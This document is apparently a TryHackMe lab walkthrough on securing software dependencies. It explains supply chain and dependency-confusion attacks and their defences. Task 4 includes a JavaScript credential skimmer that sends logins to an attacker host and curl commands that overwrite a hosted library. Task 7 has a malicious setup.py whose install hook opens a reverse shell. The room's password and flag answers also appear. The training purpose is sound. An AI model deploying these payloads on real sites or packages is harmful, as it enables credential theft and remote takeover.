# Task 1 : Introduction 

In modern software development, it's rare to find an application written completely from scratch. Writing one from scratch is not ideal as it often introduces vulnerabilities due to reinventing the wheel. Instead, developers typically rely on libraries and Software Development Kits (SDKs) to assist with basic and complex features, allowing them to focus on the unique functionality of the application.

These libraries and SDKs are referred to as **dependencies**, as the application depends on them. While dependencies simplify development, they also contribute to the attack surface of the application, making secure dependency management essential.

## Learning Objectives

This room will cover the following concepts:

- **Security Principles of Dependency Management**: Understanding the importance of securely managing dependencies to reduce vulnerabilities.
- **Securing External and Internal Dependencies**: Best practices for securing both third-party (external) and internal dependencies.
- **Dependency Confusion Attacks**: Exploring how attackers exploit issues in dependency management and how to defend against such attacks.

# Task 2 : What are dependencies?

When developing an application, it may feel like you’re writing a significant amount of code. However, the actual code you write is often a fraction of what is running behind the scenes in the dependencies that you include. Here's an example to illustrate the scale of dependencies:

### Example: `example.py`

```python
#!/usr/bin/python3
# Import the OS dependency
import numpy

x = numpy.array([1, 2, 3, 4, 5])
y = numpy.array([6])
print(x * y)
```

In this Python example, we use the NumPy library to create two arrays and multiply them. While we only wrote four lines of code, importing NumPy executes an `__init__.py` file containing 400 lines of code with an additional 30 imports. Assuming 250 lines of code per import, this one line of code triggers around 8,000 lines of dependency code.

If you extrapolate this, you’ll realize that you are responsible for only **0.01%** of the code in your application, with dependencies making up **99.99%**. This highlights the critical need for effective dependency management in software development and security.

## Dependency Management

Dependency management involves overseeing the dependencies within the Software Development Lifecycle (SDLC) and DevOps pipeline. It's important for several reasons:

- **Supportability**: Knowing the dependencies used in your application helps with troubleshooting and support.
- **Version Locking**: By locking dependencies to specific versions, you can ensure the stability of your application and avoid breaking changes.
- **Faster Deployment**: Pre-configured environments or "golden images" can speed up deployment by having all required dependencies installed.
- **Onboarding**: New developers can quickly set up their development environment by installing the required dependencies.
- **Security Monitoring**: Regularly monitoring dependencies for security issues ensures that they are updated with necessary security fixes.

Many large organizations use tools like **JFrog Artifactory** to centralize and manage dependencies. This allows organizations to integrate dependency management into their DevOps pipeline, with build servers and agents requesting dependencies from the centralized manager.

### What do we call the libraries and SDKs that are imported into our application?
Dependencies

# Task 3 : Internal vs External

Dependencies can be classified in many ways, but for this room, we will focus primarily on the **origin of the dependency**. Based on this origin, dependencies can be classified as **external** or **internal**.

## External Dependencies

An **external dependency** is one that has been developed and maintained outside of your organization. These dependencies are often publicly available, and some may be free while others are paid (e.g., SDKs). Examples of popular external dependencies include:

- Any **Python pip** package installed from the **PyPi** public repositories.
- **JQuery** and other publicly available **Node Package Manager (NPM)** libraries, such as **VueJS** or **NodeJS**.
- Paid SDKs such as **Google's ReCaptcha SDK** for integrating captchas into your application.

External dependencies include almost any dependency not created by your organization. This means someone outside your organization is responsible for maintaining the dependency.

## Internal Dependencies

An **internal dependency** is one that has been developed by someone within your organization. These dependencies are typically used only by applications developed internally. Examples of internal dependencies include:

- An **authentication library** that standardizes authentication across all internally developed applications.
- A **data-source connection library** that provides various techniques for connecting to different data sources.
- A **message translation library** that converts application messages from one format to another for use by different internal applications.

Internal dependencies are typically created to standardize internal processes and avoid reinventing the wheel. Since your organization develops and maintains these dependencies, you are responsible for their upkeep.

## External vs Internal: Security Implications

The origin of the dependency does not necessarily make it better or more secure. However, based on the origin, the **attack surface** differs, and different security measures are needed to protect each type. 

In this room, we will explore the security measures necessary for both external and internal dependencies, and we will also examine the specific security concerns associated with internal dependencies.

### Would an authentication library that we created be considered an internal or external dependency?
Internal

### Would JQuery be considered an internal or external dependency?
External

# Task 4 : Securing External Dependencies


As mentioned earlier, **external dependencies** are hosted, managed, and updated by external parties. These dependencies are important to secure within the **Software Development Life Cycle (SDLC)** because, although we are not directly responsible for their security, we must manage them to ensure the overall security of our application. In this section, we will explore some security concerns with external dependencies before diving into supply chain attacks.

## Public CVEs

The teams that develop external dependencies are made up of humans, and like all humans, they can make mistakes. This means that vulnerabilities may exist in the code they write. Once a vulnerability is discovered, it is usually disclosed publicly as a **Common Vulnerabilities and Exposures (CVE)**. While this is good practice (as it allows developers to create patches), it creates a problem for us. Once a CVE is disclosed, the specific version of the dependency we are using becomes vulnerable to an issue that is now publicly known and can be exploited by attackers.

### Challenges of Patch Management:
- **Urgency to Patch**: As soon as a CVE is disclosed, we need to react quickly and patch the vulnerable dependency.
- **Version Locking**: If we have **version locked** a dependency to ensure stability, upgrading to a new version may introduce instability in our application. We need to evaluate whether an upgrade would cause compatibility issues.
- **Transitive Dependencies**: The issue can be further complicated when a vulnerability lies not in the main SDK we are using but in one of its dependencies. This means we need to update both the dependency and the SDK.

A well-known example of this is the **Log4j vulnerability**, a Java-based logging utility that was used in almost every Java application. The discovery of a vulnerability in Log4j led to widespread impacts, as the vulnerability allowed for **remote code execution**. This affected over 1000 products, highlighting the extensive impact of vulnerabilities in widely used dependencies. The sheer scale of this issue shows how a single vulnerability can have far-reaching consequences.

## Supply Chain Attacks

Even if dependencies do not have vulnerabilities and are regularly updated, they can still be leveraged by attackers through **supply chain attacks**. These attacks target dependencies, rather than the application itself, by exploiting weaknesses in how dependencies are managed and hosted.

### Why Supply Chain Attacks?
As organizations harden their applications and make it more difficult for attackers to compromise them directly, attackers have turned to more **indirect methods**. By targeting a dependency that is part of many applications, an attacker can compromise multiple applications by compromising the dependency itself.

The **MageCart group** is a notorious example of attackers using supply chain attacks:
- They compromised the **British Airways payment portal**, which led to the theft of customer credit card information and a fine of $230 million for BA.
- They compromised over **100,000 credit card details** by embedding malicious **skimmers** in payment portals of various applications.
- They compromised **over 10,000 AWS S3 buckets**, embedding malware into JavaScript files hosted in these buckets.

These examples highlight the effectiveness of supply chain attacks, where attackers target a dependency that is used by multiple applications. By compromising a widely used dependency, they can affect numerous applications at once.

### Common Attack Vectors:
The most common method of compromising dependencies is through **insecure hosting**. If a dependency is hosted in an insecure environment (such as an **S3 bucket with world-writeable permissions**), an attacker can overwrite the legitimate dependency with a malicious version. This compromise would then be propagated to any application that relies on that dependency.

## Exploiting Supply Chains

Now, let's perform a **supply chain attack** simulation. Follow these steps:

If you inspect the code of the application (Right click->View Source), you will see that it pulls a dependency from cdn.tryhackme.loc. Let's inspect this dependency a little bit more. Open a link to that dependency, and it should allow you to download a JavaScript library called auth.js:

```js

//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        	document.getElementById("loginSubmit").click();
	}
});
```
Taking a closer look at the code in this library, it seems to add a JS event that will monitor the password textbox for keystrokes and automatically submit the login form if a user presses enter. With no real vulnerability in the code, let's take a look at where the dependency is being hosted.

If we go back one step in the request to http://cdn.tryhackme.loc:9444/libraries, we can see that this seems to be an S3 bucket hosting the dependency:

```xml
<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
```
A quick way to see if the team perhaps misconfigured the S3 bucket to grant world-writeable permissions would be to try a simple PUT request:

```shell
curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"
```

Running this request, it seems that we get an HTTP 200 OK. We can also see that we have the ability to download this new file using http://cdn.tryhackme.loc:9444/libraries/test.js. This is looking positive for a supply chain attack! At this point, there are several different ways we could go about exploiting this world-writeable S3 bucket to cause a supply chain attack, but we will keep it simple by embedding a credential skimmer that will send us the user's credentials when they click submit.

Download the auth.js dependency and modify the code to look something like this:

```js
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        try {
            const oReq = new XMLHttpRequest();
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            oReq.open("GET", "http://IPADDRESS:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        }
        catch(err) {
            console.log(err);
        }
		function sleep (time) {
                    return new Promise((resolve) => setTimeout(resolve, time));
                }
                sleep(5000).then(() => {
    		    document.getElementById("loginSubmit").click();
                });
	}
});

```

The injection is fairly simple. Once the user presses enter to submit their credentials, we make an XHR (XMLHTTPRequest) request to our host, where the username and password of the target are embedded as parameters in the request. You will notice some lines of code for the creation of a sleep function and then using said sleep function before the button is clicked. This is to ensure that the malicious XHR request has completed before the page transition occurs, otherwise a modern browser would stop the request from occurring.

Let's overwrite the existing auth.js file with our embedded skimmer:

```bash
curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js 
```

We could host an entire server to receive the keystrokes, but let's keep it simple with a Python server:

```bash
python 3 -m http.server 7070
```

We can test if our skimmer is working by using the website ourselves. Complete the form and press enter after typing in your password, and you should intercept credentials:

```bash
10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -
```

If this works, we now just need to wait for someone to authenticate! Give it 5 minutes, and you should intercept credentials from an actual user! Once you have intercepted the user's credentials, use them to authenticate to the website and recover the flag!
Defences

It is difficult to defend against the attacks staged against external dependencies since there are so many and new vulnerabilities are found daily. However, there are certain things that we can do to limit the risk:

- Make sure to update and patch dependencies on a regular basis. This would include emergency patching of dependencies if a sufficiently serious vulnerability was discovered.
- Dependencies can sometimes be copied and hosted internally. This will reduce the attack surface.
- Sub-resource Integrity can be used to prevent tampered JS libraries from loading. In the HTML include, the hash of the JS library can be added. Modern web browsers will verify the hash of the JS library, and if it does not match, the library will not be loaded.

### Which Advance Persistent Threat group is notorious for their supply chain attacks?
MageCart

### What is the password of the intercepted credentials?
supersecretpassword12345@

### What is the value of the flag you receive on the website after authenticating with the intercepted credentials?
THM{Supply.Chain.Attacks.Are.Super.Powerful}

# Task 5 : Securing Internal Dependencies

## Internal Dependencies and Security Concerns

**Internal dependencies** are libraries or SDKs that have been developed and maintained within your organization. Since your team is responsible for both the development and management of these dependencies, it is essential to ensure that they are secure. As mentioned earlier, the main purpose of creating internal dependencies is to avoid reinventing the wheel each time an application is developed. They help standardize processes, such as authentication, registration, and communication, across different applications within the organization.

## Security Concerns

While internal dependencies bring benefits in terms of standardization, they come with security concerns that must be managed properly:

- **Shared Vulnerabilities**: If an internal dependency has a security vulnerability, it can affect several different applications within the organization. Therefore, it is critical to perform thorough **security testing** of internal dependencies before they are released for use.
  
- **Legacy Code**: Internal dependencies can quickly become **legacy code**. If the developer responsible for a dependency leaves the company, the dependency may no longer receive updates or maintenance. If a vulnerability is discovered in such a dependency, it could become a significant security risk, especially if it is used across multiple applications. This issue can be exacerbated if the documentation is not kept up to date, making it difficult for new developers to take over responsibility for the dependency.

- **Storage and Access Control**: A unique security concern with internal dependencies is their **storage** and **access control**. Dependencies need to be accessible by developers, but they should not be easily modifiable. If any developer can modify an internal dependency, an attacker compromising just one developer could affect several applications. Therefore, it's important to protect **write access** to dependencies, and in some organizations, even **read access** may be restricted to reduce the attack surface.

## Tools for Managing Internal Dependencies

To manage internal dependencies effectively, organizations can use a variety of tools based on their needs:

- **Single Language Environment**: If the organization develops applications using a single programming language (e.g., Python), an internal repository can be hosted, such as an **internal PyPi server**. This allows dependencies to be uploaded and installed similarly to how they would be retrieved from the internet-facing PyPi repository.

- **Multi-Language Environment**: In a multi-language environment, organizations often use more sophisticated dependency managers like **JFrog Artifactory**. This tool enables centralized management of dependencies and integrates with the **DevOps pipeline**. Developers can access dependencies from Artifactory while writing code, which also supports managing both internal and external dependencies.

  Artifactory is a useful tool, but if compromised, it could have a **significant impact** on the organization's applications. One type of attack that can target dependency managers is called **Dependency Confusion**, which will be explored in the next task.

By effectively managing internal dependencies, organizations can ensure that their development processes are standardized while maintaining security. However, it's crucial to consider the potential risks and implement the necessary security measures to prevent vulnerabilities from spreading across multiple applications.


# Task 6 : Theory of a Dependency Confusion


## Dependency Confusion

Dependency Confusion is a vulnerability that can exist if our organisation uses internal dependencies that are managed through a dependency manager. In short, a race condition can be created by an attacker that could lead to a malicious dependency being used instead of the internal one. In this task, we will look into the theory of a Dependency Confusion vulnerability before practically exploiting one in the next task.

## Background

Dependency Confusion was discovered by Alex Birsan in 2021. The issue stems from how internal dependencies are managed. Let's take a look at a simple example in Python:

```bash
pip install numpy
```

What actually happens in the background when we run this command? When we run this command, pip will connect to the external PyPi repository to look for a package called numpy, find the latest version, and install it. In the past, there have been some interesting ways this package could be compromised through a supply chain attack:

- **Typosquatting** - An attacker hosts a package called nunpy, hoping that a developer will mistype the name and install their malicious package.
- **Source Injection** - An attacker contributes to the package for a new feature through a pull request but also embeds a vulnerability in the code that could be used to compromise applications that make use of the package.
- **Domain Expiry** - Sometimes, the developers of packages may forget to renew the domain where their email is being hosted. If this happens, an attacker can buy the expired domain, allowing them full control over email, which could be used to reset the password of a package maintainer to gain full control over the package. This is a common risk for legacy packages on these external repositories.

There are several other supply chain attack methods, but all of them target the dependency or its maintainers directly. If we wanted to use pip to install an internal package and we followed the example on StackOverflow (like all good developers do), our build step would look something like this:

```bash
pip install numpy --extra-index-url https://our-internal-pypi-server.com/
```

The `--extra-index-url` argument tells pip that an additional Pypi server should be inspected for the package. But what if numpy exists in both the internal repo and the external, public-facing PyPi repo? How does pip know which package to install? Well, it's simple, it will collect the package from all available repos, compare the version numbers, and then install the package with the highest version number. You should start to see the problem here.

## Staging a Dependency Confusion Attack

All an attacker really needs to stage an internal dependency attack is the name of one of your internal dependencies. While this might seem like a challenge, it happens more frequently than you would expect:

- Developers often ask questions on public forums such as StackOverflow but do not obfuscate sensitive information such as the names of libraries being used, some of which could be internal dependencies.
- Some compiled applications like NodeJS will often disclose internal package names in their package.json file, which is usually exposed in the application itself.

Once an attacker learns the name of an internal dependency, they can attempt to host a package with a similar name on one of the external package repos but with a higher version number. This will force any system that attempts to build the application and install the dependency to get confused between the internal and external package, and if the external one is chosen, the attacker's dependency confusion attack will succeed. The full attack is shown in the diagram below:

**Diagram for showing dependency confusion**

## Considerations

There are a couple of things that should be kept in mind:

- Since we only know the name of the internal package, not the actual source code of the package, if we perform a dependency confusion attack, the build process of the pipeline will most likely fail at a later step since the actual package was not installed.
- Our external version number must be higher than the version number of the internal package for the confusion to work in our favour. However, this is easy since we can simply have a package with version number 9000 since most packages have major version numbers lower than 10.
- Dependency confusion can affect any type of package, such as Python pip packages, JavaScript npm packages, or Ruby gems packages. We will demonstrate the attack through Python for simplicity.

Let's look at practically performing a dependency confusion attack in the next task.

![[InsertFileHere]]


### What is the name of a common supply chain attack that relies on users mistyping the names of packages that they wish to install?
Typosquatting

### Dependency confusion relies on a race condition of what of a package?
Version

# Task 7 : Practical Exploitation of Dependency Confusion

## Environment Explained

This machine simulates a build environment that has the following:

- Internal Dependency Manager - Pypi
- Build Server - Docker-Compose

The build environment will rebuild an API application every 5 minutes. Once you have given the machine a couple of minutes to start, you can verify that the API is working by running the following:
```bash
curl http://MACHINE_IP:8181/api/list
```
You should see that the API responds with a dataset. If you don't get a response, wait another 5 minutes and then try again.

## Dependency Disclosure

The developer of the application has posted a question on a public forum:

Upload Package to Internal Pypi Server

Hi all, how would I upload a pip package to our internal Pypi server? I know I would use the following to upload it externally, but what should I change?

```bash
twine upload dist/datadbconnect-0.0.2.tar.gz
```

Is there a flag or something that I can add?

In the post, the developer seems to have disclosed the name of an internal package, *datadbconnect* . This is all we need to get started on our Dependency Confusion attack!

## Remote Code Execution in the Installation Step

To stage a Dependency Confusion attack, we will need to develop and build a malicious package that will execute code once installed. Since we only know the name of the package and don't have access to the source code, the application will most likely fail once it tries to run our package, so our safest bet is to get remote code execution earlier in the process. Hence, we want remote code execution once the package installation completes.

This is probably a good place to explain how Pip packages are built from Python code. If you want to explore the process in more depth, have a look at tutorials like this. Here we will give a quick overview. The most basic Pip package requires the following structure:
```bash
package_name/
    package_name/
    __init__.py
    main.py
    setup.py
```
- package_name - This is the name of the package that we are creating. In our case, it will be datadbconnect
- __init__.py - Each Pip package requires an init file that tells Python that there are files here that should be included in the build. In our case, we will keep this empty.
- main.py - The main file that will execute when the package is used. We will create a very simple main file.
- setup.py - This is the file that contains the build and installation instructions. When developing Pip packages, you can use setup.py, setup.cfg, or pyproject.toml. However, since our goal is remote code execution, setup.py will be used since it is the simplest for this goal.

Recreate this folder structure for your malicious package. Add the following code to your main.py:
```py
#!/usr/bin/python3
def main():
   print ("Hello World")

if __name__=="__main__":
   main()
```
This is simply filler code to ensure that the package does contain some code for the build. The more important part is the setup.py code. Let's take a look at what a normal setup.py file would look like:

```py
from setuptools import find_packages
from setuptools import setup

VERSION = 'v0.0.1'
 
setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
)
```
In order to inject code execution, we need to ensure that the package executes code once it is installed. Fortunately, setuptools, the tooling we use for building the package, has a built-in feature that allows us to hook in the post-installation step. This is usually used for legitimate purposes, such as creating shortcuts to the binaries once they are installed. However, combining this with Python's os library, we can leverage it to gain remote code execution. Update your setup.py file with the following:
```py
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)
```

Let's take a look at the adjustments that we made. Firstly, we imported the install library from setuptools and the os library:
```py
from setuptools.command.install import install
import os
import sys
```
We also updated the version of our package to ensure that we win the dependency confusion race:
```py
VERSION = 'v9000.0.2'
```

Next, we introduced a new function that will work as a post-installation hook to run a reverse shell for us. Remember to add your AttackBox or VPN IP:
```py
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print ("Hello World from installer, this proves our injection works")
        os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
```
Lastly, we hook the post-installation process in our setup configuration:
```py
cmdclass={
        'install': PostInstallCommand
    },
```
Now that we have created the package, it is time to build it and upload it to the external PyPI repo. We can use the following command to build our package:

```bash
python3 setup.py sdist
```

Once built, our Pip package will be available under the dist folder and can be uploaded to the Pypi repo using twine:
```bash
twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080
```

If you are asked for credentials, just leave them empty. You can also safely ignore the error and warning messages as long as the final output shows the package upload reaching 100%. Just a reminder again that we are simulating an external PyPI repo to not break their terms of service. If this were a real attack, the package would be uploaded to PyPI's main repo. Let's start a listener for our shell:
```bash
nc -lvp 8080
```
We can test the code execution of our package by installing it directly ourselves:
```bash
pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose
```
You should see the print line in the output of the installation command and see that pip freezes when you get a reverse shell connection:
AttackBox Terminal


```bash         
[thm@thm]$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 50098
$ whoami
root
```
      

If this works, restart your listener and wait for about 5 minutes, you should magically get a callback from the build server once it tries to rebuild the docker container and installs our malicious package!

## Explaining what is Happening in the Background

So how is this actually happening? Let's take a dive into the vulnerable line in the DockerFile:
```bash
RUN pip3 install datadbconnect --no-cache-dir --trusted-host internal.pypi-server.com --extra-index-url "http://internal.pypi-server:8081/simple/"
```

Knowing that this is an internal package, the developer team added an additional Pypi repo for Pip through the --extra-index-url argument. However, this does not force Pip to download the package from that location. Rather, it is just another location where it can look for the package. Pip will therefore download the package from internal.pypi-server.com (legitimate package) and external.pypi-server.loc (our malicious package) and compare the two versions. Since our version is higher, it will install our package instead! This is where the name Dependency Confusion comes from!

## Defences

Protecting internal dependencies is a massive security endeavour. Since we have to create, maintain, and host these dependencies ourselves, the security project is much larger than that of external dependencies. The following defence strategies should be considered for all internal dependencies:

- Internal dependencies should be actively maintained. This will ensure that vulnerabilities in these dependencies do not affect multiple applications and services.
- The hosting infrastructure of internal dependencies should be secured. The following Microsoft whitepaper provides the following three key focus areas:
- Reference one private feed, not multiple. This contributes to protecting against dependency confusion attacks. With our python example, we would then use --index-url argument instead of --extra-index-url to indicate that the package must be collected from the specified index.
- Protect your packages using controlled scopes. By controlling the scopes of dependencies, it will ensure that dependencies are locked to the applications that require them.
- Utilise client-side verification features. Controls such as sub-resource integrity or version locking will ensure that applications and services will detect when malicious code is introduced into a dependency and refuse to execute it.
- As an additional defence measure against dependency confusion attacks, the names of internal dependencies can be registered on external package managers without the source code to claim the name. This will prevent an attacker from registering a similarly named package.

### What is the name of the attack that can be launched to create a race condition between internal and external dependencies with the same name?
Dependency Confusion

### What is the flag's value that is stored in the /root/ directory on the docker container where you get remote code execution?
THM{RCE.Through.Dependency.Confusion}

# Task 8 : Conclusion

In this room, we discussed the security controls and misconfigurations commonly found with dependency management. This is by no means an exhaustive list of what should be considered for the security of dependencies. However, to summarise, we should be considering the following:

- **Be aware of the dependencies you use in your applications and systems.** Also, be aware that these dependencies may have dependencies, which will grow the list of dependencies you will need to keep tabs on.
  
- **Always use the latest versions of dependencies.** Both internal and external dependencies should be updated regularly. More often than not, these updates are not just to introduce new features but to fix existing issues and bugs.

- **Consider the configuration and use of dependency managers, especially for internal dependencies.** It is not just the dependencies themselves that should be considered for security, but also how we configure and use our dependency managers.

- **Include dependencies and dependency management systems in the attack surface.** Dependencies and their management systems should be seen as part of the application or system attack surface during the development lifecycle.

---
**Note:** Security should be a priority when dealing with dependencies, as vulnerabilities in these areas can lead to significant risks in the overall system.